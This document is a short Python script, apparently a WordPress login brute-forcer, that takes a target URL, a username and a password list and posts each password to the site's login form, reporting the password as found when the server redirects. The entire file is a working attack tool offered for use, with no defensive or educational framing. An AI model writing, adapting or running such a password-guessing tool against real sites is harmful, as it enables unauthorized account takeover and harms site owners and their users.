import os , random , requests , time ,argparse , sys  

def loader (count) :  

    a = "-" * (count % 2 == 0 ) + "+" * ( count % 2 != 0 ) 
    sys.stdout.write("\r[{0}] Attacking [{1}] >".format(a,a ))
    sys.stdout.flush() 

def attempt_login( username , password , url)  :   

    try : 
        HEADERS = { 
                    "Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain"
                  } 
        
        #change this params if needed 
        PARAMS={ 
                'log':username, 
                'pwd':password,
                'wp-submit':'Log In',  
                }  

        resp = requests.post(url = url, data = PARAMS , headers = HEADERS , allow_redirects=False)    
    
    except Exception as e : 
        print("\n*** Connection Error has occured *** "  )  
        exit()

    return resp.status_code 
 
def execute  () :      
    t1 = time.time()      
    count  = 0  
    FOUND = False       

    #load the files 
    File = args.passlist 
    if File  :        

        try :   
            Test = open(os.path.expanduser('~') +  File )     
            Test.close()  
            File = os.path.expanduser('~') +  File  

        except FileNotFoundError : 
            File = args.passlist  

    else : 
        File = "test.txt"    

    with open(File , 'r' ) as passwords:
        for password in passwords:     
            count+=1 
            
            #loading  effects
            loader(count) 

            password = password.rstrip("\n" )  

            url = args.url   

            #attempt login   
            status  = attempt_login(args.username , password  , args.url )     
            
            if status == 302 :       
                FOUND = True 
                print(f'\n\n[+] **** PASSWORD FOUND ***** [+] =====> [{password}] for user { args.username }')           
                t2 = time.time()  
                print(f'[-] Time lapsed : {t2-t1} seconds  [-] ' )   
                print(f'[-] Number of attempts : {count} [-] ' )  
                break  
             

    if not FOUND :  
        t2 = time.time() 
        print("\n\n[x] ***** PASSWORD NOT FOUND ***** [x]" )    
        print("[-] Try another password list [-] " )  
        print(f'[-] Time lapsed : {t2-t1} seconds  [-] ' )   
        print(f'[-] Number of attempts : {count} [-] ' )  


def main () :   
    global args 
    #parser
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", help="valid username" )
    parser.add_argument("-t", "--url", help="url/target to attack  ")
    parser.add_argument("-p", "--passlist", help="password list address ")
     
    args = parser.parse_args()       

    print(""" 
   ____      ____ _________  ____________  ____________                         
   \   \    /   / |_____   | |______     \ |_   ______|  
    \   \/\/   /  |     ___|   |    |   _/  |    ___|         
     \        /   |    |       |    |    \  |    |     
      \__/\__/    |____|       |_________/  |____|    

                ***********************
                * By : intrglctcMilk  *  
                *     -- @tmpts       * 
                *********************** \n
     """ )    

    #call execute function to start the attack
    execute() 


if __name__ == "__main__":
    main()  
